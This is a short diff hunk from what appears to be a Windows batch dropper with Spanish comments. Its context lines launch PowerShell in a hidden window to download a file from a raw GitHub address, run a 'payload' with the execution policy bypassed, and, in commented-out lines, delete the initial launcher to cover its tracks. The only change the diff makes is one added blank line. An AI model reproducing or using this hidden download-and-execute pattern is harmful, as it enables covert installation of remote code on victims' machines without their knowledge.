@@ -16,6 +16,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 @REM Corriendo el payload
 powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd
 
+
 @REM Borramos el iniciador
 @REM cd %INITIALPATH%
 @REM DEL "initial.cmd"
